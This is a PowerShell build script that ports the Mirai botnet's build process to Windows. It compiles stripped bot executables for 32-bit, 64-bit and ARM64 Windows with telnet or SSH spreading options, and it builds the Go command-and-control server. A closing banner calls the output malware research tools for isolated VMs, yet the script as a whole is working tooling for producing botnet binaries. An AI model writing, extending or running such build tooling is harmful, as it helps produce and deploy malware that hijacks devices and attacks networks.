# Windows Build Script for Mirai - PowerShell Version
# Converts Linux build.sh to Windows PowerShell
param(
  [Parameter(Mandatory = $true)]
  [ValidateSet('debug', 'release')]
  [string]$BuildType,
    
  [Parameter(Mandatory = $true)]
  [ValidateSet('telnet', 'ssh')]
  [string]$Protocol
)

$ErrorActionPreference = "Stop"
$FLAGS = ""

Write-Host "🔧 Windows Mirai Build System" -ForegroundColor Cyan
Write-Host "Build Type: $BuildType" -ForegroundColor Yellow
Write-Host "Protocol: $Protocol" -ForegroundColor Yellow
Write-Host ""

# Set protocol-specific flags
switch ($Protocol) {
  "telnet" { $FLAGS = "-DMIRAI_TELNET" }
  "ssh" { $FLAGS = "-DMIRAI_SSH" }
}

function Compile-WindowsBot {
  param(
    [string]$Arch,
    [string]$OutputName,
    [string]$CompilerFlags
  )
    
  Write-Host "Compiling Windows bot for $Arch..." -ForegroundColor Green
    
  # Windows-specific compilation using MSVC or MinGW
  $sourceFiles = Get-ChildItem "bot\*.c" -Name | ForEach-Object { "bot\$_" }
  $sourceList = $sourceFiles -join " "
    
  # Use MinGW-w64 for cross-platform compilation
  $compiler = "gcc"  # Assumes MinGW-w64 in PATH
  $windowsFlags = "-DWIN32 -D_WIN32_WINNT=0x0601 -lws2_32 -lkernel32 -luser32"
    
  $compileCommand = "$compiler -std=c99 $CompilerFlags $windowsFlags $sourceList -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release\$OutputName.exe -DMIRAI_BOT_ARCH=`"$Arch`""
    
  try {
    Write-Host "Command: $compileCommand" -ForegroundColor Gray
    Invoke-Expression $compileCommand
        
    if (Test-Path "release\$OutputName.exe") {
      Write-Host "✅ Successfully compiled: release\$OutputName.exe" -ForegroundColor Green
            
      # Strip symbols using MinGW strip
      $stripCommand = "strip release\$OutputName.exe -S --strip-unneeded --remove-section=.note --remove-section=.comment"
      Invoke-Expression $stripCommand
      Write-Host "✅ Stripped symbols from $OutputName.exe" -ForegroundColor Green
    }
  }
  catch {
    Write-Host "❌ Compilation failed for $OutputName" -ForegroundColor Red
    Write-Host "Error: $_" -ForegroundColor Red
  }
}

function Build-WindowsCnC {
  Write-Host "Building Windows C&C Server..." -ForegroundColor Green
    
  # Check if Go is installed
  if (-not (Get-Command "go" -ErrorAction SilentlyContinue)) {
    Write-Host "❌ Go compiler not found. Please install Go first." -ForegroundColor Red
    return
  }
    
  # Build Go C&C server with Windows-specific settings
  $env:GOOS = "windows"
  $env:GOARCH = "amd64"
    
  try {
    Push-Location "cnc"
    go build -o "..\release\cnc-windows.exe" *.go
    Pop-Location
        
    if (Test-Path "release\cnc-windows.exe") {
      Write-Host "✅ Successfully built C&C server: release\cnc-windows.exe" -ForegroundColor Green
    }
  }
  catch {
    Write-Host "❌ C&C build failed" -ForegroundColor Red
    Write-Host "Error: $_" -ForegroundColor Red
    if ($PWD.Path -ne (Get-Location).Path) { Pop-Location }
  }
}

# Main build logic
if ($BuildType -eq "release") {
  Write-Host "🧹 Cleaning previous builds..." -ForegroundColor Yellow
    
  # Clean previous builds
  if (Test-Path "release") {
    Remove-Item "release\mirai*.exe" -ErrorAction SilentlyContinue
    Remove-Item "release\cnc*.exe" -ErrorAction SilentlyContinue
  }
  else {
    New-Item -ItemType Directory -Path "release" -Force | Out-Null
  }
    
  # Build C&C Server
  Build-WindowsCnC
    
  # Build Windows bot variants
  Write-Host ""
  Write-Host "🤖 Building Windows bot variants..." -ForegroundColor Cyan
    
  # Windows x86 (32-bit)
  Compile-WindowsBot -Arch "i586" -OutputName "mirai-win32" -CompilerFlags "$FLAGS -DKILLER_REBIND_SSH -m32"
    
  # Windows x64 (64-bit)  
  Compile-WindowsBot -Arch "x86_64" -OutputName "mirai-win64" -CompilerFlags "$FLAGS -DKILLER_REBIND_SSH -m64"
    
  # ARM64 Windows (for newer ARM-based Windows devices)
  if (Get-Command "aarch64-w64-mingw32-gcc" -ErrorAction SilentlyContinue) {
    Write-Host "Building ARM64 variant..." -ForegroundColor Green
    $sourceFiles = Get-ChildItem "bot\*.c" -Name | ForEach-Object { "bot\$_" }
    $sourceList = $sourceFiles -join " "
    $armCompileCommand = "aarch64-w64-mingw32-gcc -std=c99 $FLAGS -DKILLER_REBIND_SSH -DWIN32 -D_WIN32_WINNT=0x0601 -lws2_32 $sourceList -O3 -o release\mirai-arm64.exe"
    try {
      Invoke-Expression $armCompileCommand
      Write-Host "✅ Successfully compiled ARM64 variant" -ForegroundColor Green
    }
    catch {
      Write-Host "⚠️ ARM64 compilation failed (optional)" -ForegroundColor Yellow
    }
  }
    
  Write-Host ""
  Write-Host "📋 Build Summary:" -ForegroundColor Cyan
  if (Test-Path "release") {
    $builtFiles = Get-ChildItem "release\*.exe" | ForEach-Object { $_.Name }
    foreach ($file in $builtFiles) {
      $size = (Get-Item "release\$file").Length
      Write-Host "  ✅ $file ($([math]::Round($size/1KB, 1)) KB)" -ForegroundColor Green
    }
  }
    
}
elseif ($BuildType -eq "debug") {
  Write-Host "🐛 Debug build mode..." -ForegroundColor Yellow
    
  if (-not (Test-Path "release")) {
    New-Item -ItemType Directory -Path "release" -Force | Out-Null
  }
    
  # Debug build with symbols and debug info
  Compile-WindowsBot -Arch "x86_64" -OutputName "mirai-debug" -CompilerFlags "$FLAGS -DDEBUG -g -O0"
    
  Write-Host "✅ Debug build complete" -ForegroundColor Green
}

Write-Host ""
Write-Host "🎯 Windows Build Complete!" -ForegroundColor Green
Write-Host ""
Write-Host "⚠️  SECURITY WARNING:" -ForegroundColor Red
Write-Host "   This builds malware research tools." -ForegroundColor Red  
Write-Host "   Use only in isolated environments for security research." -ForegroundColor Red
Write-Host ""
Write-Host "📁 Output directory: release\" -ForegroundColor Cyan
Write-Host "🔧 Next: Test in isolated VM environment" -ForegroundColor Yellow